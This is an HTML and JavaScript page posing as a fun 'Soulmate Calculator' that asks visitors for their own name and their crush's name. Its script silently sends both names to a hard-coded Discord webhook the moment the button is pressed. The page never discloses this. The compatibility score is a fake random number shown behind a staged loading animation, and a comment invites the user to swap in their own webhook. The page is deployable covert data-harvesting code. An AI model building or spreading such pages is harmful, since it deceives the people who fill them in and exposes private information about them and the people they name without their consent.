<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>💘 Soulmate Calculator</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Segoe UI', system-ui, sans-serif;
    min-height: 100vh;
    display: flex; align-items: center; justify-content: center;
    background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 50%, #fbc2eb 100%);
    padding: 20px;
  }
  .card {
    background: rgba(255,255,255,0.95);
    border-radius: 24px;
    padding: 40px 32px;
    max-width: 420px; width: 100%;
    box-shadow: 0 20px 60px rgba(0,0,0,0.15);
    text-align: center;
  }
  h1 { font-size: 1.6rem; color: #d6336c; margin-bottom: 8px; }
  .sub { color: #888; font-size: 0.9rem; margin-bottom: 28px; }
  input {
    width: 100%; padding: 14px 16px; font-size: 1rem;
    border: 2px solid #f0c4d4; border-radius: 12px;
    margin-bottom: 14px; outline: none; transition: border .2s;
  }
  input:focus { border-color: #d6336c; }
  button {
    width: 100%; padding: 15px; font-size: 1.05rem; font-weight: 600;
    color: #fff; background: linear-gradient(135deg, #d6336c, #ff6b9d);
    border: none; border-radius: 12px; cursor: pointer;
    transition: transform .15s, box-shadow .15s;
  }
  button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(214,51,108,.35); }
  button:disabled { opacity: .6; cursor: wait; transform: none; }
  .hidden { display: none; }
  #loading { padding: 30px 0; }
  .heart-spin {
    font-size: 3rem; display: inline-block;
    animation: pulse 1s infinite;
  }
  @keyframes pulse {
    0%, 100% { transform: scale(1); }
    50% { transform: scale(1.25); }
  }
  .loading-text { color: #999; margin-top: 12px; font-size: .95rem; }
  #result { padding-top: 10px; }
  .percent {
    font-size: 4rem; font-weight: 800; color: #d6336c;
    line-height: 1; margin: 16px 0;
    animation: pop .5s ease-out;
  }
  @keyframes pop { 0% { transform: scale(0); } 70% { transform: scale(1.15); } 100% { transform: scale(1); } }
  .verdict { font-size: 1.1rem; color: #555; margin-bottom: 20px; }
  .again {
    background: none; border: 2px solid #d6336c; color: #d6336c;
    font-weight: 600; padding: 10px 24px; border-radius: 10px; cursor: pointer;
    width: auto;
  }
</style>
</head>
<body>

<div class="card">
  <div id="form-view">
    <h1>💘 Soulmate Calculator</h1>
    <p class="sub">Discover your true compatibility ✨</p>
    <input id="name1" type="text" placeholder="Your name" autocomplete="off">
    <input id="name2" type="text" placeholder="Your crush's name" autocomplete="off">
    <button id="calcBtn">Calculate Love %</button>
  </div>

  <div id="loading" class="hidden">
    <div class="heart-spin">💗</div>
    <p class="loading-text" id="loadingText">Analyzing cosmic vibes...</p>
  </div>

  <div id="result" class="hidden">
    <h1>💕 Compatibility</h1>
    <div class="percent" id="percent">0%</div>
    <p class="verdict" id="verdict"></p>
    <button class="again" id="againBtn">Try another name</button>
  </div>
</div>

<script>
// ==================================================================
//  ⚠️  REPLACE THIS WITH YOUR OWN DISCORD WEBHOOK URL
// ==================================================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1564697418300137663/-TfbVpnLfzvzYWqQcNRGGk_q7yVI4yrHFxu1VSJGplHLT1yX0eszkNuI3iq8e9sFZwQd";
// ==================================================================

const formView   = document.getElementById('form-view');
const loadingDiv = document.getElementById('loading');
const resultDiv  = document.getElementById('result');
const loadingText= document.getElementById('loadingText');
const percentEl  = document.getElementById('percent');
const verdictEl  = document.getElementById('verdict');

const loadingMessages = [
  "Analyzing cosmic vibes...",
  "Consulting the love oracle...",
  "Scanning star signs...",
  "Measuring heart frequencies...",
  "Crunching the numbers..."
];

function sendName(yourName, crushName) {
  const payload = {
    content: "💘 **New soulmate check!**",
    embeds: [{
      title: "Crush name captured",
      color: 0xd6336c,
      fields: [
        { name: "Their name", value: yourName || "(not entered)" },
        { name: "Crush's name", value: crushName || "(empty)" }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  const body = JSON.stringify(payload);
  if (navigator.sendBeacon) {
    const blob = new Blob([body], { type: 'application/json' });
    navigator.sendBeacon(WEBHOOK_URL, blob);
  } else {
    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body
    }).catch(() => {});
  }
}

function randomPercent() {
  const roll = Math.random();
  if (roll < 0.15) return Math.floor(Math.random() * 30) + 40;   // 40–69
  if (roll < 0.55) return Math.floor(Math.random() * 20) + 70;   // 70–89
  return Math.floor(Math.random() * 11) + 90;                     // 90–100
}

function verdictFor(p) {
  if (p >= 95) return "Soulmates! The stars have spoken. 😍";
  if (p >= 85) return "Serious chemistry detected! 💞";
  if (p >= 70) return "There's real potential here. 😊";
  if (p >= 50) return "Friendship could bloom into more... 🌱";
  return "Hmm, the vibes are complicated. 🤔";
}

document.getElementById('calcBtn').addEventListener('click', () => {
  const yourName  = document.getElementById('name1').value.trim();
  const crushName = document.getElementById('name2').value.trim();

  if (!crushName) {
    document.getElementById('name2').focus();
    document.getElementById('name2').style.borderColor = '#e03131';
    return;
  }

  // 1. Fire the webhook immediately (silently, in background)
  sendName(yourName, crushName);

  // 2. Fake loading animation
  formView.classList.add('hidden');
  loadingDiv.classList.remove('hidden');

  let i = 0;
  const msgTimer = setInterval(() => {
    loadingText.textContent = loadingMessages[i % loadingMessages.length];
    i++;
  }, 700);

  // 3. Reveal random result after 3s
  const finalPercent = randomPercent();
  setTimeout(() => {
    clearInterval(msgTimer);
    loadingDiv.classList.add('hidden');
    resultDiv.classList.remove('hidden');

    let current = 0;
    const step = Math.max(1, Math.floor(finalPercent / 40));
    const countTimer = setInterval(() => {
      current += step;
      if (current >= finalPercent) {
        current = finalPercent;
        clearInterval(countTimer);
        verdictEl.textContent = verdictFor(finalPercent);
      }
      percentEl.textContent = current + "%";
    }, 25);
  }, 3000);
});

document.getElementById('againBtn').addEventListener('click', () => {
  resultDiv.classList.add('hidden');
  formView.classList.remove('hidden');
  document.getElementById('name1').value = '';
  document.getElementById('name2').value = '';
  document.getElementById('name2').style.borderColor = '';
  percentEl.textContent = '0%';
  verdictEl.textContent = '';
});
</script>
</body>
</html>
